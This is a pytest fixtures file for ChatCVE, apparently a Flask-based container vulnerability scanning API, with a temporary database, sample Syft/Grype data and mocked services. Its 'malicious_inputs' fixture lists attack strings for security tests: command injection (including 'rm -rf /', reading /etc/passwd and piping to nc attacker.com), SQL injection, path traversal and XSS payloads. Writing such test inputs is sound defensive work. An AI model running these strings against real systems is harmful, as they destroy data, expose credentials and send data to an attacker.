"""
Pytest configuration and fixtures for ChatCVE API tests.
"""

import os
import sys
import json
import tempfile
import sqlite3
from datetime import datetime
from unittest.mock import MagicMock, patch

import pytest

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask_backend import app as flask_app


# ============================================================================
# Flask Application Fixtures
# ============================================================================

@pytest.fixture
def app():
    """Create Flask application for testing."""
    flask_app.config.update({
        "TESTING": True,
    })
    yield flask_app


@pytest.fixture
def client(app):
    """Test client for Flask application."""
    return app.test_client()


@pytest.fixture
def runner(app):
    """Test CLI runner for Flask application."""
    return app.test_cli_runner()


# ============================================================================
# Database Fixtures
# ============================================================================

@pytest.fixture
def test_db():
    """Create a temporary test database with schema."""
    with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as f:
        db_path = f.name

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # Create scan_metadata table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS scan_metadata (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_timestamp TEXT,
            user_scan_name TEXT,
            image_count INTEGER,
            scan_duration REAL,
            total_packages_scanned INTEGER,
            total_vulnerabilities_found INTEGER,
            scan_status TEXT,
            scan_type TEXT,
            syft_version TEXT,
            grype_version TEXT,
            scan_engine TEXT,
            scan_source TEXT,
            risk_score REAL,
            critical_count INTEGER,
            high_count INTEGER,
            medium_count INTEGER,
            low_count INTEGER,
            exploitable_count INTEGER,
            scan_initiator TEXT,
            compliance_policy TEXT,
            scan_tags TEXT,
            project_name TEXT,
            environment TEXT
        )
    """)

    # Create app_patrol table for vulnerability data
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS app_patrol (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            IMAGE_TAG TEXT,
            PACKAGE TEXT,
            VERSION TEXT,
            VULNERABILITY TEXT,
            SEVERITY TEXT,
            DESCRIPTION TEXT,
            NAME TEXT,
            INSTALLED TEXT,
            DATE_ADDED TEXT,
            FIXED_IN TEXT,
            SCAN_NAME TEXT
        )
    """)

    conn.commit()
    conn.close()

    yield db_path

    # Cleanup
    os.unlink(db_path)


@pytest.fixture
def populated_db(test_db):
    """Test database with sample data."""
    conn = sqlite3.connect(test_db)
    cursor = conn.cursor()

    # Insert sample scan metadata
    cursor.execute("""
        INSERT INTO scan_metadata (
            scan_timestamp, user_scan_name, image_count, scan_duration,
            total_packages_scanned, total_vulnerabilities_found, scan_status,
            scan_type, risk_score, critical_count, high_count, medium_count, low_count
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        datetime.now().isoformat(), 'Test Scan', 2, 45.5,
        150, 10, 'SUCCESS', 'FULL', 35.5, 2, 3, 3, 2
    ))

    # Insert sample vulnerabilities
    vulnerabilities = [
        ('nginx:latest', 'openssl', '1.1.1', 'CVE-2024-0001', 'CRITICAL', 'Test vuln 1'),
        ('nginx:latest', 'curl', '7.88.0', 'CVE-2024-0002', 'HIGH', 'Test vuln 2'),
        ('nginx:latest', 'zlib', '1.2.11', 'CVE-2024-0003', 'MEDIUM', 'Test vuln 3'),
        ('redis:7', 'openssl', '1.1.1', 'CVE-2024-0001', 'CRITICAL', 'Test vuln 1'),
        ('redis:7', 'ncurses', '6.2', 'CVE-2024-0004', 'LOW', 'Test vuln 4'),
    ]

    for vuln in vulnerabilities:
        cursor.execute("""
            INSERT INTO app_patrol (IMAGE_TAG, PACKAGE, VERSION, VULNERABILITY, SEVERITY, DESCRIPTION, DATE_ADDED, SCAN_NAME)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (*vuln, datetime.now().isoformat(), 'Test Scan'))

    conn.commit()
    conn.close()

    return test_db


# ============================================================================
# Scanner Fixtures
# ============================================================================

@pytest.fixture
def scanner():
    """Create a RegistryBasedScanner instance with mocked dependencies."""
    with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as f:
        db_path = f.name

    # Import scanner after path setup
    from scan_service import RegistryBasedScanner

    with patch('shutil.which', return_value='/usr/bin/mock'):
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout='mock version 1.0', stderr='')
            scanner_instance = RegistryBasedScanner(db_path=db_path)

    yield scanner_instance

    # Cleanup
    os.unlink(db_path)


# ============================================================================
# Mock Fixtures - External Services
# ============================================================================

@pytest.fixture
def mock_openai():
    """Mock OpenAI/LangChain responses."""
    with patch('flask_backend.ChatOpenAI') as mock_chat:
        mock_instance = MagicMock()
        mock_instance.invoke.return_value = MagicMock(
            content="Based on the vulnerability data, there are 2 critical CVEs affecting your containers."
        )
        mock_chat.return_value = mock_instance
        yield mock_instance


@pytest.fixture
def mock_subprocess():
    """Mock subprocess for Syft/Grype/Docker calls."""
    with patch('subprocess.run') as mock:
        yield mock


@pytest.fixture
def mock_asyncio_subprocess():
    """Mock asyncio subprocess for async command execution."""
    with patch('asyncio.create_subprocess_exec') as mock:
        process_mock = MagicMock()
        process_mock.returncode = 0
        process_mock.communicate = MagicMock(return_value=(b'success', b''))
        mock.return_value = process_mock
        yield mock


# ============================================================================
# Sample Data Fixtures
# ============================================================================

@pytest.fixture
def sample_scan_result():
    """Sample scan result data."""
    return {
        'image': 'nginx:latest',
        'packages': 150,
        'vulnerabilities': 5,
        'severity_counts': {
            'critical': 1,
            'high': 2,
            'medium': 1,
            'low': 1
        },
        'exploitable_count': 3,
        'vuln_details': [
            {
                'id': 'CVE-2024-1234',
                'severity': 'critical',
                'package': 'openssl',
                'version': '1.1.1',
                'fixed_in': ['1.1.2']
            },
            {
                'id': 'CVE-2024-5678',
                'severity': 'high',
                'package': 'curl',
                'version': '7.88.0',
                'fixed_in': ['7.88.1']
            }
        ]
    }


@pytest.fixture
def sample_syft_output():
    """Sample Syft SBOM output."""
    return {
        'artifacts': [
            {'name': 'openssl', 'version': '1.1.1', 'type': 'deb'},
            {'name': 'curl', 'version': '7.88.0', 'type': 'deb'},
            {'name': 'nginx', 'version': '1.24.0', 'type': 'deb'},
            {'name': 'zlib', 'version': '1.2.11', 'type': 'deb'},
        ],
        'source': {
            'type': 'image',
            'target': 'nginx:latest'
        }
    }


@pytest.fixture
def sample_grype_output():
    """Sample Grype vulnerability output."""
    return {
        'matches': [
            {
                'vulnerability': {
                    'id': 'CVE-2024-1234',
                    'severity': 'Critical',
                    'description': 'Buffer overflow in OpenSSL',
                    'fix': {'versions': ['1.1.2']}
                },
                'artifact': {'name': 'openssl', 'version': '1.1.1'}
            },
            {
                'vulnerability': {
                    'id': 'CVE-2024-5678',
                    'severity': 'High',
                    'description': 'Remote code execution in curl',
                    'fix': {'versions': ['7.88.1']}
                },
                'artifact': {'name': 'curl', 'version': '7.88.0'}
            },
            {
                'vulnerability': {
                    'id': 'CVE-2024-9012',
                    'severity': 'Medium',
                    'description': 'Information disclosure in zlib',
                    'fix': {'versions': ['1.2.12']}
                },
                'artifact': {'name': 'zlib', 'version': '1.2.11'}
            }
        ]
    }


@pytest.fixture
def sample_vulnerability_stats():
    """Sample vulnerability statistics."""
    return {
        'total': 150,
        'critical': 10,
        'high': 35,
        'medium': 60,
        'low': 45
    }


# ============================================================================
# Security Test Fixtures
# ============================================================================

@pytest.fixture
def malicious_inputs():
    """Collection of malicious inputs for security testing."""
    return {
        'command_injection': [
            'nginx; rm -rf /',
            'nginx && cat /etc/passwd',
            'nginx | nc attacker.com 1234',
            'nginx`whoami`',
            'nginx$(id)',
            'nginx\n\rmalicious',
        ],
        'sql_injection': [
            "nginx'; DROP TABLE scans;--",
            "nginx\" OR \"1\"=\"1",
            "nginx UNION SELECT * FROM users",
            "nginx'; INSERT INTO users VALUES('hacker');--",
        ],
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/passwd',
            'file:///etc/passwd',
        ],
        'xss': [
            '<script>alert("xss")</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert('xss')",
        ],
        'oversized': [
            'a' * 10000,  # Very long string
            'nginx:' + 'a' * 1000,  # Long tag
        ]
    }


# ============================================================================
# Async Helpers
# ============================================================================

@pytest.fixture
def event_loop():
    """Create event loop for async tests."""
    import asyncio
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()
